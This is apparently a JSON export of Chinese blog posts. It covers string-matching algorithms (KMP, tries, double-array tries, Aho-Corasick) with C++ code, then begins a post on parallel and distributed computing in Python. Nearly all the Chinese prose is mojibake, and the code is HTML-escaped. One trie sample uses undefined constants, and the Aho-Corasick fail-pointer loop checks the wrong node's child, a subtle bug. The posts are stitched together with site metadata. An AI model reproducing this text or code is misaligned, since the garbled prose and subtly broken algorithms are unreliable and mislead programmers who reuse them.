é¦–å…ˆï¼Œæœ‰ä¸€éƒ¨åˆ†åŒ¹é…ï¼Œæ‰å¯ä»¥æ“ä½œï¼Œæ‰æœ‰å¤šçš„ä¿¡æ¯å˜›ã€‚ é‚£ä¹ˆï¼Œç›®çš„å°±æ˜¯ä¿è¯å·²ç»åŒ¹é…çš„éƒ¨åˆ†ï¼Œåœ¨Sä¸­ï¼Œä¸å†é‡å¤åŒ¹é…ã€‚ 12S: aaaaaababaaaaaW: ababc æ¯”å¦‚ï¼Œä¸Šä¾‹ï¼ŒababåŒ¹é…ï¼Œcä¸åŒ¹é…ï¼Œé‡æ–°å›é€€4ä¸ªä½ç½®åŒ¹é…å—ï¼ŸWçš„ä¿¡æ¯æˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œè¿™æœ«ç«¯abcä¸åŒ¹é…ï¼Œé‡Œé¢è¿˜æœ‰abaå•Šï¼Œå¹¶ä¸”ä»Så½“å‰åŒ¹é…çš„ä¿¡æ¯ï¼Œå‘ç°abaï¼Œå·²ç»å†æ¬¡åŒ¹é…ï¼ŒSçš„æŒ‡é’ˆä¸éœ€è¦å›é€€ï¼ ç°åœ¨çš„é—®é¢˜ï¼Œæ˜¯Wçš„ä¿¡æ¯æ€ä¹ˆè¡¨ç¤ºï¼Ÿéœ€è¦ä»€ä¹ˆä¿¡æ¯ï¼Ÿéƒ¨åˆ†å­ä¸²å‰ç¼€å’Œåç¼€ç›¸åŒçš„ä¿¡æ¯ã€‚ åªéœ€è¦ä¸€ä¸ªæ•°ç»„ï¼Œå‘Šè¯‰æˆ‘ä»¬ï¼Œå½“å‡ºç°ä¸åŒ¹é…å­—ç¬¦æ—¶ï¼Œå¯ä»¥è·³è¿‡é‚£äº›é‡å¤çš„ä¸€å®šä¼šå†æ¬¡åŒ¹é…çš„éƒ¨åˆ†ã€‚ ç°åœ¨ï¼Œé—®é¢˜å°±æ˜¯ï¼šæ‰¾åˆ° W å¯¹åº”çš„å›é€€æ•°ç»„Nï¼Œé¡ºåºåŒ¹é… S ä¸ Wï¼ŒæŒ‰ç…§ N çš„ä¿¡æ¯å›é€€ã€‚ æ—¶é—´å¤æ‚åº¦ï¼šO(|S|+|W|) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;using namespace std;void get_backoff(string &amp;pattern, vector&lt;int&gt; &amp;book)&#123; for (int i = 1, j = 0; i &lt; (int)pattern.size(); i++) &#123; while (j &amp;&amp; pattern[i] != pattern[j]) &#123; // ä¸åŒ¹é…ï¼Œå›é€€åˆ°ä¸Šä¸€ä¸ªç›¸åŒå‰ç¼€ j = book[j - 1]; &#125; // åŒ¹é…ï¼Œæ›´æ–°ç›¸åŒçš„å‰ç¼€çš„æœ€åä¸€ä¸ªindex if (pattern[i] == pattern[j]) j++; // æ›´æ–°bookï¼Œè®°å½•ç›¸åŒçš„å‰ç¼€çš„æœ€åä¸€ä¸ªindex book[i] = j; &#125;&#125;int kmp(string &amp;s, string &amp;p, int begin)&#123; int res = -1; vector&lt;int&gt; book(p.size()); get_backoff(p, book); for (int i = begin, j = 0; i &lt; (int)s.size(); ++i) &#123; while (j &amp;&amp; s[i] != p[j]) // å›é€€p j = book[j - 1]; if (s[i] == p[j]) j++; if (j == (int)p.size()) &#123; res = i - p.size() + 1; &#125; &#125; return res;&#125;int main(int argc, char *argv[])&#123; string s = \"abskajakajkafkkakaj\"; string p = \"kkakaj\"; string pre = \"abskajakajkaf\"; cout &lt;&lt; kmp(s, p, 0) &lt;&lt; endl; cout &lt;&lt; pre.size() &lt;&lt; endl; return 0;&#125; Trieå‰ç¼€æ ‘æˆ–å­—å…¸æ ‘ ä»å¤´åˆ°å°¾ï¼Œä½¿ç”¨è¾“å…¥ä¸²ä¸­çš„ä¸€ä¸ªå­—ç¬¦æ¥ç¡®å®šè¦è¿›å…¥çš„ä¸‹ä¸€ä¸ªçŠ¶æ€ã€‚é€‰æ‹©æ ‡è®°æœ‰ç›¸åŒå­—ç¬¦çš„è¾¹ç¼˜ä»¥è¡Œèµ°ã€‚æ¯ä¸€æ­¥éƒ½æ¶ˆè€—ä¸€ä¸ªå­—ç¬¦ã€‚ ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰å­å­™éƒ½æœ‰ç›¸åŒçš„å‰ç¼€ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªèŠ‚ç‚¹å¯¹åº”çš„å­—ç¬¦ã€‚ æœ‰ä»€ä¹ˆå¼ºçš„ï¼Ÿ ä»æ ¹åˆ°å¶éå†æ‰€éœ€çš„æ—¶é—´ä¸å–å†³äºæ•°æ®åº“çš„å¤§å°ï¼Œè€Œæ˜¯ä¸é”®çš„é•¿åº¦æˆæ¯”ä¾‹ã€‚å› æ­¤ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå®ƒé€šå¸¸æ¯”Bæ ‘æˆ–ä»»ä½•åŸºäºæ¯”è¾ƒçš„ç´¢å¼•æ–¹æ³•å¿«å¾—å¤šã€‚å®ƒçš„æ—¶é—´å¤æ‚åº¦ä¸å“ˆå¸ŒæŠ€æœ¯ç›¸å½“ã€‚ é™¤äº†æ•ˆç‡å¤–ï¼Œåœ¨æ‹¼å†™é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œtrieè¿˜æä¾›äº†æœç´¢æœ€è¿‘è·¯å¾„çš„çµæ´»æ€§ã€‚ èƒ½åšä»€ä¹ˆï¼Ÿ å¤špattternåŒ¹é… æ¯”å¦‚ï¼Œä½ æœ‰å¾ˆå¤šä¸ªpatternï¼Œè¦åŒæ—¶åœ¨ä¸€ä¸ªstring sä¸­æŸ¥æ‰¾ï¼Œæ˜¯å¦å‡ºç°ã€‚ä½¿ç”¨Trieä¿å­˜patternï¼Œä½œä¸ºç´¢å¼•ï¼Œåœ¨stringä¸­æœç´¢ï¼Œå¯ä»¥åŠ å¿«æ•ˆç‡ã€‚ ã€‚ã€‚ã€‚ brute forceéœ€è¦ O(|Text| *|Patterns|) Trieéœ€è¦ O(|Text| * |Len of Longest Pattern|) åŠ ä¸Šæ„é€  Trie çš„ O(|Patterns|)ã€‚ éœ€è¦é¢å¤–ç©ºé—´å¤æ‚åº¦ï¼ŒO(|Patterns|)ã€‚ æ€ä¹ˆå®ç°ï¼Ÿ æœ€åŸºç¡€çš„å®ç°æ–¹å¼å¦‚ä¸Šå›¾ã€‚å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;bits/stdc++.h&gt;using namespace std;int trie[STACSIZE][N]; //æ‰‹åŠ¨å¼€è¾Ÿæ ˆç©ºé—´// æˆ–è€…// vector&lt;map&lt;char,int&gt;&gt; trie[STACSIZE][N]; //æ‰‹åŠ¨å¼€è¾Ÿæ ˆç©ºé—´// æˆ–è€…// vector&lt;unordered_map&lt;char,int&gt;&gt; trie[STACSIZE][N]; //æ‰‹åŠ¨å¼€è¾Ÿæ ˆç©ºé—´int counts[STACSIZE]; //è®¡æ•°int idx = 0;void insert(string &amp;s)&#123; int p = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int c = s[i] - 'a'; if (trie[p][c] == 0) trie[p][c] = ++idx; //æ²¡æœ‰èŠ‚ç‚¹ï¼Œåˆ›é€ èŠ‚ç‚¹ï¼ŒæŒ‡å®šåœ¨æ ˆç©ºé—´çš„ä½ç½® p = trie[p][c]; //æ›´æ–°å½“å‰ä½ç½®ï¼Œè¿›å…¥cèŠ‚ç‚¹ &#125; counts[p]++; //æ›´æ–°è®¡æ•°&#125;int query(string &amp;s)&#123; int p = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int c = s[i] - 'a'; if (!trie[p][c]) return 0; p = trie[p][c]; &#125; return counts[p];&#125;int main(int argc, char **argv)&#123; for (int i = 0; i &lt; 5; i++) &#123; string s; cin &gt;&gt; s; insert(s); &#125; for (int i = 0; i &lt; 5; i++) &#123; string s; cin &gt;&gt; s; cout &lt;&lt; query(s) &lt;&lt; endl; &#125; return 0;&#125; ä»¥ä¸Šæ–¹æ³•ï¼Œå°±ç©ºé—´ä½¿ç”¨è€Œè¨€ï¼Œè¿™æ˜¯ç›¸å½“å¥¢ä¾ˆçš„ï¼Œå› ä¸ºåœ¨trieä¸­ï¼Œå¤§å¤šæ•°èŠ‚ç‚¹åªæœ‰å‡ ä¸ªåˆ†æ”¯ï¼Œè€Œå¤§å¤šæ•°è¡¨å•å…ƒæ ¼ä¸ºç©ºç™½ã€‚æ›´ç´§å‡‘çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨é“¾è¡¨å­˜å‚¨æ¯ä¸ªçŠ¶æ€çš„è½¬æ¢ã€‚ä½†æ˜¯ç”±äºæ˜¯çº¿æ€§æœç´¢ï¼Œå¯¼è‡´è®¿é—®é€Ÿåº¦å˜æ…¢ã€‚ å› æ­¤ï¼Œå¤§ä½¬è®¾è®¡å‡ºäº†å¿«é€Ÿè®¿é—®çš„è¡¨å‹ç¼©æŠ€æœ¯æ¥è§£å†³è¯¥é—®é¢˜ã€‚ Double-Array Trieï¼šåŒ…å«baseå’Œcheckä¸¤ä¸ªæ•°ç»„ã€‚baseæ•°ç»„çš„æ¯ä¸ªå…ƒç´ è¡¨ç¤ºä¸€ä¸ªTrieèŠ‚ç‚¹ï¼Œå³ä¸€ä¸ªçŠ¶æ€ ï¼›checkæ•°ç»„è¡¨ç¤ºæŸä¸ªçŠ¶æ€çš„å‰é©±çŠ¶æ€ã€‚ ç¤ºæ„å›¾æ‰€ç¤ºï¼Œæ„é€ ä¸¤ä¸ªæ•°ç»„ï¼Œä¸€ä¸ªbaseå¯¹åº”ä¸€ä¸ªå‰é©±checkã€‚ ä¸€æ­¥çŠ¶æ€è½¬ç§»é€»è¾‘ä¸ºï¼š t := base [ s ] + c ; å¦‚æœ check[ t ] = sï¼Œ åˆ™ next s := t å¦‚æœ check[ t ] = -sï¼Œ åˆ™ next s := t ä¸” t æ˜¯ä¸€ä¸ªç»ˆæ­¢çŠ¶æ€ï¼ˆæ¯”å¦‚è¡¨ç¤ºä¸€ä¸ªè¯çš„ç»“å°¾ï¼‰ å¦åˆ™ è½¬ç§»å¤±è´¥ å®ç°ï¼Œå°±æš‚æ—¶ä¸ç ”ç©¶äº†ã€‚ More about å¤šä¸ªpatternåŒ¹é… é™¤äº†Trieï¼Œè¿˜æœ‰é’ˆå¯¹ string s å»ºæ ‘çš„ Suffix Trie. å¯¹ stringï¼šp a n a m a b a n an a sã€‚æ„å»ºåç¼€Trie å°† pattern é€ä¸ªè¾“å…¥ï¼Œè¿›è¡ŒåŒ¹é…ã€‚æ­¤æ—¶ï¼Œä¸éœ€è¦åŒ¹é…åˆ°å¶å­èŠ‚ç‚¹ã€‚ é¢å¤–ç©ºé—´å¤æ‚åº¦ï¼Œå’Œ string s æœ‰å…³ã€‚å‹ç¼©æ— åˆ†æ”¯åç¼€ä¹‹åï¼Œå°±æˆäº†Suffix Treeã€‚ è‹¥å†å‹ç¼©ç©ºé—´ï¼Œå¯ä»¥å°†suffix å˜æˆ idx + lengthã€‚ é¢å¤–ç©ºé—´å¤æ‚åº¦ä¸ºï¼ŒO(|Text|)ã€‚ä½¿ç”¨ Suffix Trieï¼Œå¤špatternåŒ¹é…çš„æ—¶é—´å¤æ‚åº¦ä¸ºï¼š O(|Text| + |Patterns|)ï¼ŒTrie ä¸º O(|Text| * |Len of Longest Pattern|)ã€‚ é¢å¤–ç©ºé—´å¤æ‚åº¦ä¸º O(|Text|)ï¼ŒTrie ä¸º O(|Patterns|)ã€‚åªæ˜¯ O(|Text|) çš„ç³»æ•°çº¦ä¸º20ï¼Œå½“æ–‡æœ¬å¾ˆé•¿æ—¶ï¼Œè¿˜æ˜¯ç®—äº†å§ã€‚ ACè‡ªåŠ¨æœº è¿˜æ˜¯ï¼Œå¤š pattern åŒ¹é…é—®é¢˜ï¼Œåœ¨åªæ˜¯ä½¿ç”¨Trieï¼Œåœ¨string sä¸Šæš´åŠ›éå†ï¼Œåªæ˜¯å¯»æ‰¾æˆåŠŸçš„é‚£ä¸€åˆ»ï¼Œå¤±è´¥çš„åŒ¹é…é‚£éƒ½æ˜¯æ²¡æœ‰æ„ä¹‰çš„å—ï¼Ÿ ä¸ä¸ä¸ï¼Œå¾—è®©å¤±è´¥çš„å­˜åœ¨ï¼Œè¿™ä¸œè¥¿è¶Šæ··æ²Œï¼Œä¿¡æ¯ç†µè¶Šé«˜ï¼Œæœ‰ç”¨ã€‚ ACè‡ªåŠ¨æœºï¼ŒTrie + KMPï¼ŒåŠ é€Ÿå¤špatternåŒ¹é…è¿‡ç¨‹ã€‚åŒ¹é…è¿‡ç¨‹æ—¶é—´å¤æ‚åº¦Oï¼ˆ|Text| * Trieæ ‘é«˜ï¼‰ã€‚ æ„å»º patterns çš„ Trie æ„å»º fail æŒ‡é’ˆ å¼€å§‹åŒ¹é… æ„å»º fail æŒ‡é’ˆ åœ¨Trieä¸­ï¼ŒBFSéå†ï¼Œç¬¬ä¸€å±‚ï¼ŒfailæŒ‡é’ˆéƒ½æŒ‡å‘ root ç¬¬ä¸€å±‚ä¹‹åï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„ fail æŒ‡é’ˆï¼ŒæŒ‡å‘ ã€è¯¥èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‘ çš„ ã€failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ã€‘ çš„ ã€å„¿å­èŠ‚ç‚¹ã€‘ä¸­ ã€å’Œè¯¥èŠ‚ç‚¹ï¼ˆè‡ªå·±ï¼‰åŒå­—ç¬¦çš„èŠ‚ç‚¹ã€‘ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œã€failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ã€‘ç»§ç»­å‘ä¸Šæ‰¾ fail èŠ‚ç‚¹ï¼Œç›´åˆ° rootã€‚ å•¥æ˜¯ fail ï¼Ÿ å½“å‰å•è¯çš„æœ€é•¿åç¼€ã€‚ åŒ¹é…è¿‡ç¨‹ è¾“å…¥string sï¼Œtrieä» rootå¼€å§‹ï¼Œè¿›è¡ŒåŒ¹é… å½“åŒ¹é…å¤±è´¥ï¼Œè·³è½¬åˆ°failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ï¼Œå¦‚æœfailåˆ° rootï¼Œè¾“å…¥æ­¤ä½ç½®ä¹‹åçš„string sçš„éƒ¨åˆ†ï¼Œç»§ç»­æŸ¥æ‰¾ã€‚ å½“åŒ¹é…æˆåŠŸï¼ˆTrieæ ‡è®°çš„èŠ‚ç‚¹ï¼‰ï¼Œä¹Ÿè·³è½¬åˆ°failæŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹ï¼Œå¦‚æœæ­¤æ—¶è·³è½¬åˆ° rootï¼Œè¿›è¡Œå›æº¯åˆ°å‰ä¸€ä¸ªæœ€é•¿çš„trieè·¯å¾„èŠ‚ç‚¹ã€‚ è·³è½¬ï¼Œå°±æ˜¯åœ¨åŒ¹é…åç¼€ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;bits/stdc++.h&gt;using namespace std;static int idx = 0;struct trieNode&#123; int son[26] = &#123;0&#125;; int counts = 0; int fail = -1;&#125;;void insert(const string &amp;s, vector&lt;trieNode&gt; &amp;trie)&#123; int p = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int cha = s[i] - 'a'; if (!trie[p].son[cha]) trie[p].son[cha] = ++idx; p = trie[p].son[cha]; &#125; trie[p].counts++;&#125;void build_fail(vector&lt;trieNode&gt; &amp;trie)&#123; queue&lt;int&gt; q; for (int i = 0; i &lt; 26; i++) &#123; if (trie[0].son[i] != 0) &#123; //å„¿å­èŠ‚ç‚¹ int son = trie[0].son[i]; trie[son].fail = 0; //ç¬¬ä¸€å±‚ fail q.push(son); &#125; &#125; while (q.size()) &#123; int father = q.front(); q.pop(); for (int i = 0; i &lt; 26; i++) &#123; if (trie[father].son[i] != 0) &#123; int cur = trie[father].son[i]; // è¦æ‰¾failçš„å„¿å­ int failOfFather = trie[father].fail; // çˆ¶èŠ‚ç‚¹çš„fail // ~(0): -1, ~(-1): 0 //ä¸æ˜¯æ ¹èŠ‚ç‚¹ä¸”æ²¡æœ‰æ‰¾åˆ°ç›®æ ‡åŒå­—ç¬¦ while (~failOfFather &amp;&amp; !trie[father].son[i]) failOfFather = trie[failOfFather].fail; if (~failOfFather) //æ‰¾åˆ°ç›®æ ‡åŒå­—ç¬¦ trie[cur].fail = trie[failOfFather].son[i]; else // æ ¹èŠ‚ç‚¹ trie[cur].fail = 0; q.push(cur); &#125; &#125; &#125;&#125;int query(const string &amp;s, vector&lt;trieNode&gt; &amp;trie)&#123; int ans = 0; int ptr = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int word = s[i] - 'a'; // å„¿å­ä¸å­˜åœ¨ä¸”failä¸æ˜¯æ ¹èŠ‚ç‚¹ï¼Œè·³è½¬ fail while (!trie[ptr].son[word] &amp;&amp; ~trie[ptr].fail) ptr = trie[ptr].fail; if (trie[ptr].son[word]) // å„¿å­å­˜åœ¨ï¼ŒåŒ¹é…ï¼Œè¿›å…¥èŠ‚ç‚¹ï¼Œç»§ç»­æŸ¥æ‰¾ ptr = trie[ptr].son[word]; else // æ˜¯æ ¹èŠ‚ç‚¹ï¼Œä¸‹ä¸€ä¸ª s å­—ç¬¦ continue; int ptr_temp = ptr; // copt ptrï¼Œpträ¸ºå›æº¯ä½ç½® while (~trie[ptr_temp].fail) //åˆ°æ ¹èŠ‚ç‚¹é€€å‡ºï¼Œä¸‹ä¸€ä¸ªå¤–å±‚forå›æº¯ &#123; ans += trie[ptr_temp].counts; // countsåœ¨ä¸æ˜¯ç›®æ ‡å¤„ä¸º0 ptr_temp = trie[ptr_temp].fail; &#125; &#125; return ans;&#125;int main(int argc, char **argv)&#123; vector&lt;trieNode&gt; trie; trie.resize(50); insert(\"she\", trie); string s = \"he\"; insert(s, trie); insert(\"her\", trie); insert(\"is\", trie); insert(\"this\", trie); insert(\"his\", trie); build_fail(trie); cout &lt;&lt; query(\"sherthis\", trie) &lt;&lt; endl;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Algorithm","slug":"Notes/Algorithm","permalink":"https://racleray.github.io/categories/Notes/Algorithm/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://racleray.github.io/tags/algorithm/"},{"name":"kmp","slug":"kmp","permalink":"https://racleray.github.io/tags/kmp/"},{"name":"trie","slug":"trie","permalink":"https://racleray.github.io/tags/trie/"},{"name":"Aho-Corasick","slug":"Aho-Corasick","permalink":"https://racleray.github.io/tags/Aho-Corasick/"}]},{"title":"æµ…æ¶‰pythonä¸åˆ†å¸ƒå¼","slug":"æµ…æ¶‰pythonä¸åˆ†å¸ƒå¼","date":"2021-02-24T12:23:25.000Z","updated":"2023-08-07T11:54:31.046Z","comments":true,"path":"posts/cdee5c8d.html","link":"","permalink":"https://racleray.github.io/posts/cdee5c8d.html","excerpt":"è®°å½•å…³äºå¹¶è¡Œè®¡ç®—çš„ä¸€ç‚¹ä¸œè¥¿ã€‚åŒ…æ‹¬å¹¶è¡Œä¸åˆ†å¸ƒå¼çš„æ¦‚å¿µã€ä½¿ç”¨pythonå·¥å…·åŒ…çš„ç®€å•ç¤ºä¾‹ã€‚","text":"å¹¶è¡Œå’Œåˆ†å¸ƒå¼è®¡ç®—ä»‹ç» ç°ä»£è®¡ç®—çš„ç‰¹ç‚¹ï¼Œä¸»æ¿ä¸Šå®‰è£…å¤šå—å¤„ç†å™¨ï¼ˆæ¯ä¸ªå¤„ç†å™¨å«æœ‰å¤šä¸ªæ ¸å¿ƒï¼‰ï¼Œè¿™ä½¿å¾—è®¡ç®—æœºèƒ½çœŸæ­£åœ°å®ç°å¹¶å‘ã€‚ ä¸€ä¸ªå¤„ç†å™¨åŒä¸€æ—¶é—´åªèƒ½å¤„ç†åŒä¸€äº‹åŠ¡ï¼›åé¢ç« èŠ‚æˆ‘ä»¬ä¼šçœ‹åˆ°ï¼Œå½“å¤„ç†å™¨å¿«åˆ°ä¸€å®šç¨‹åº¦ï¼Œå°±å¯ä»¥ç»™å‡ºåŒä¸€æ—¶é—´è¿›è¡Œå¤šé¡¹ä»»åŠ¡çš„å‡è±¡ã€‚è‹¥è¦çœŸæ­£å®ç°åŒä¸€æ—¶é—´å¤šä»»åŠ¡ï¼Œå°±éœ€è¦å¤šä¸ªå¤„ç†å™¨ã€‚ å¦ä¸€ä¸ªæ˜¯é«˜é€Ÿè®¡ç®—æœºç½‘ç»œã€‚å®ƒè®©æ— ç©·å¤šçš„ç”µè„‘å®ç°äº†ç›¸äº’é€šè®¯ã€‚ å¹¶è¡Œè®¡ç®— å¹¶è¡Œè®¡ç®—æ˜¯åŒæ—¶ä½¿ç”¨å¤šä¸ªå¤„ç†å™¨å¤„ç†äº‹åŠ¡ã€‚ åˆ†å¸ƒå¼è®¡ç®— åˆ†å¸ƒå¼è®¡ç®—æ˜¯æŒ‡åŒä¸€æ—¶é—´ä½¿ç”¨å¤šå°è®¡ç®—æœºå¤„ç†ä¸€ä¸ªä»»åŠ¡ã€‚åªæœ‰å½“è®¡ç®—æœºä¹‹é—´äº’ç›¸è¿æ¥æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨åˆ†å¸ƒå¼è®¡ç®—ã€‚è¦è®°ä½ï¼ŒçœŸæ­£çš„ç“¶é¢ˆå¾€å¾€æ˜¯æ•°æ®è€Œä¸æ˜¯CPUã€‚ å¹¶è¡Œå’Œåˆ†å¸ƒå¼è®¡ç®—çš„æœ€æ˜æ˜¾çš„å·®å¼‚å°±æ˜¯åº•å±‚çš„å†…å­˜æ¶æ„å’Œè®¿é—®æ–¹å¼ä¸åŒã€‚ å¹¶è¡Œå’Œå››ä¸ªå¤„ç†å™¨å¯ä»¥è®¿é—®åŒä¸€å†…å­˜åœ°å€ã€‚å¯¹äºåˆ†å¸ƒå¼åº”ç”¨ï¼Œä¸åŒçš„å¹¶å‘ä»»åŠ¡ä¸èƒ½æ­£å¸¸è®¿é—®åŒä¸€å†…å­˜ã€‚åŸå› æ˜¯ï¼Œä¸€äº›ä»»åŠ¡æ˜¯åœ¨è¿™ä¸€å°è®¡ç®—æœºè¿è¡Œï¼Œä¸€äº›ä»»åŠ¡æ˜¯åœ¨å¦ä¸€å°è®¡ç®—æœºè¿è¡Œï¼Œå®ƒä»¬æ˜¯ç‰©ç†åˆ†éš”çš„ï¼Œé€šè¿‡ç½‘ç»œè¿›è¡Œæ•°æ®ä¼ è¾“ã€‚ ç°å®ä¸­ï¼Œè®¡ç®—æœºç½‘ç»œé€šè®¯å°±åƒä¸€ä¸ªçº¯ç²¹çš„åˆ†å¸ƒå¼å†…å­˜æ¶æ„ã€‚ç„¶è€Œï¼Œæ¯å°è®¡ç®—æœºæœ‰å¤šä¸ªå¤„ç†å™¨ï¼Œè¿è¡Œç€å…±äº«å¼å†…å­˜æ¶æ„ã€‚ åˆ†å¸ƒå¼å†…å­˜ç³»ç»Ÿæ‰©å±•æ€§å¼ºã€ç»„å»ºæˆæœ¬ä½ï¼šéœ€è¦æ›´é«˜æ€§èƒ½ï¼Œæ‰©å±•å³å¯ã€‚å¦ä¸€ä¼˜ç‚¹æ˜¯ï¼Œå¤„ç†å™¨å¯ä»¥è®¿é—®å„è‡ªçš„å†…å­˜ï¼Œä¸å¿…æ‹…å¿ƒå‘ç”ŸRace conditionã€‚ ç¼ºç‚¹æ˜¯ï¼Œå¼€å‘è€…éœ€è¦æ‰‹åŠ¨å†™æ•°æ®ä¼ è¾“çš„ç­–ç•¥ï¼Œéœ€è¦è€ƒè™‘æ•°æ®å­˜å‚¨çš„ä½ç½®ã€‚å¦å¤–ï¼Œä¸æ˜¯æ‰€æœ‰ç®—æ³•éƒ½èƒ½å®¹æ˜“ç§»æ¤åˆ°è¿™ç§æ¶æ„ã€‚ é˜¿å§†è¾¾å°”å®šå¾‹ è€ƒè™‘ä¸€ä¸ªéƒ¨åˆ†å¹¶è¡Œçš„ç®—æ³•ï¼Œç§°Pä¸ºå¹¶è¡Œåˆ†é‡ï¼ŒSä¸ºåºåˆ—åˆ†é‡ï¼ˆå³éå¹¶è¡Œåˆ†é‡ï¼‰ï¼ŒP+S=100%ã€‚T(n)ä¸ºè¿è¡Œæ—¶é—´ï¼Œå¤„ç†å™¨æ•°é‡ä¸ºnã€‚ å¯¹æ¯”T(n)å’ŒT(1)å¯ä»¥å¾—åˆ°ï¼Œåˆ†å¸ƒå¼å¤„ç†çš„åŠ é€Ÿæ¯”ã€‚ éšç€nçš„æé«˜ï¼ŒåŠ é€Ÿçš„æ•ˆæœä¸è®©äººæ»¡æ„ã€‚ä½¿ç”¨10ä¸ªå¤„ç†å™¨ï¼Œæ˜¯9.2å€é€Ÿã€‚ä½¿ç”¨100ä¸ªå¤„ç†å™¨ï¼Œåˆ™æ˜¯50å€é€Ÿã€‚ä½¿ç”¨1000ä¸ªå¤„ç†å™¨ï¼Œä»…ä»…æ˜¯91å€é€Ÿã€‚ é˜¿å§†è¾¾å°”å®šå¾‹å‘Šè¯‰æˆ‘ä»¬ä¸¤ç‚¹ï¼šæˆ‘ä»¬æœ€å¿«å¯ä»¥å°†å€é€Ÿæé«˜åˆ°å¤šå°‘ï¼›æ”¶ç›Šå‡å°‘æ—¶ï¼Œä½•æ—¶åº”è¯¥å‡å°‘ç¡¬ä»¶èµ„æºçš„æŠ•å…¥ã€‚ å¼‚æ­¥ç¼–ç¨‹ï¼ˆéé˜»å¡ç¼–ç¨‹ï¼‰ ä¸ä¼ ç»Ÿçš„åŒæ­¥ç¼–ç¨‹ç›¸æ¯”ï¼Œå¼‚æ­¥ç¼–ç¨‹æˆ–éé˜»å¡ç¼–ç¨‹ï¼Œå¯ä»¥ä½¿æ€§èƒ½è·å¾—æå¤§æé«˜ã€‚ ç†æƒ³çš„çŠ¶æ€åº”è¯¥æ˜¯å®‰æ’ä¸€ä¸‹ä»»åŠ¡ï¼Œå½“ä¸€ä¸ªä»»åŠ¡ç­‰å¾…I/Oæ—¶ï¼Œå®ƒå¤„äºæ‚¬åœçŠ¶æ€ï¼Œå°±è®©å¦ä¸€ä¸ªä»»åŠ¡æ¥ç®¡CPUã€‚è¿™å°±æ˜¯å¼‚æ­¥ï¼ˆä¹Ÿç§°ä¸ºäº‹ä»¶é©±åŠ¨ï¼‰ç¼–ç¨‹ã€‚ ä½¿ç”¨å¤šçº¿ç¨‹åœ¨ä¸åŒçš„çº¿ç¨‹å¹¶è¡Œè¿è¡Œï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€ä¸ªæ˜¾è‘—çš„ä¸åŒï¼šä½¿ç”¨å¤šçº¿ç¨‹æ—¶ï¼Œæ˜¯ç”±æ“ä½œç³»ç»Ÿå†³å®šå“ªä¸ªçº¿ç¨‹å¤„äºè¿è¡Œæˆ–æ‚¬åœã€‚ç„¶è€Œï¼Œåœ¨å¼‚æ­¥ç¼–ç¨‹ä¸­ï¼Œæ¯ä¸ªä»»åŠ¡å¯ä»¥è‡ªå·±å†³å®šæ˜¯å¦æ”¾å¼ƒCPUã€‚ å¦å¤–ï¼Œå•å•ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼Œæˆ‘ä»¬ä¸èƒ½åšå‡ºçœŸæ­£çš„å¹¶å‘ï¼šåŒä¸€æ—¶é—´ä»…ä»…æœ‰ä¸€ä¸ªä»»åŠ¡åœ¨è¿è¡Œã€‚ å¦ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼Œå¼‚æ­¥ç¼–ç¨‹æ›´å–„äºå¤„ç†I/Oå¯†é›†å‹ä»»åŠ¡ï¼Œè€Œä¸æ˜¯CPUå¯†é›†å‹ä»»åŠ¡ï¼ˆæš‚åœä»»åŠ¡ä¸ä¼šä½¿æ€§èƒ½æé«˜ï¼‰ã€‚ ä»»ä½•å¼‚æ­¥ä»£ç éƒ½è¦ç²¾å¿ƒé€‰æ‹©éé˜»å¡çš„åº“ï¼Œä»¥é˜²ä½¿ç”¨é˜»å¡ä»£ç ã€‚ åç¨‹ åœ¨Pythonä¸­ï¼Œè®©ä¸€ä¸ªåŠŸèƒ½ä¸­é€”æš‚åœçš„å…³é”®æ˜¯ä½¿ç”¨åç¨‹ã€‚ åç¨‹å°±æ˜¯ä¸€ç±»å‡½æ•°ï¼Œå®ƒå¯ä»¥é€šè¿‡yieldï¼Œåœ¨æŒ‡å®šä½ç½®æš‚åœæˆ–ç»§ç»­ä»»åŠ¡ã€‚éœ€è¦æ³¨æ„ï¼Œå°½ç®¡åç¨‹æ˜¯å¼ºåŒ–çš„ç”Ÿæˆå™¨ï¼Œåœ¨æ¦‚å¿µæ„ä¹‰ä¸Šå¹¶ä¸ç­‰äºç”Ÿæˆå™¨ã€‚åŸå› æ˜¯ï¼Œåç¨‹ä¸è¿­ä»£æ— å…³ã€‚å¦ä¸€ä¸åŒç‚¹ï¼Œç”Ÿæˆå™¨äº§ç”Ÿå€¼ï¼Œè€Œåç¨‹æ¶ˆé™¤å€¼ã€‚ 